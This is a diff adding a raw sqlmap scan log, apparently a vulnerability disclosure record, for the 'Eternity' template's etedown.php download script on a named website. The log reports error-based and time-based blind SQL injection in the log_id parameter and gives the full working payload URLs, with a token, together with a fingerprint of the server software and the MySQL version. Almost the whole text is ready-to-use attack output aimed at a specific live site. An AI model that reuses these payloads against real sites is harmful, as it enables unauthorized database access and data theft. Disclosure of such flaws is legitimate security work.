@@ -1,0 +1,13 @@
+sqlmap identified the following injection point(s) with a total of 1196 HTTP(s) requests:
+---
+Parameter: #1* (URI)
+    Type: error-based
+    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
+    Payload: http://www.5iml.com/content/templates/Eternity/inc/functions/etedown/etedown.php?back_url=https://www.5iml.com/wzym/272.html&down_id=0&log_id=2720'XOR(272) AND EXTRACTVALUE(6289,CONCAT(0x5c,0x7170707871,(SELECT (ELT(6289=6289,1))),0x716b766271))-- mFdaif(now()=sysdate(),sleep(6),0))XOR'Z&token=c16402f38eacb432e2f5063f330ad8ab&token_name=ete_down_nonce
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: http://www.5iml.com/content/templates/Eternity/inc/functions/etedown/etedown.php?back_url=https://www.5iml.com/wzym/272.html&down_id=0&log_id=2720'XOR(272) AND (SELECT 1102 FROM (SELECT(SLEEP(5)))YjHk)-- ueedif(now()=sysdate(),sleep(6),0))XOR'Z&token=c16402f38eacb432e2f5063f330ad8ab&token_name=ete_down_nonce
+---
+web application technology: Nginx
+back-end DBMS: MySQL >= 5.1
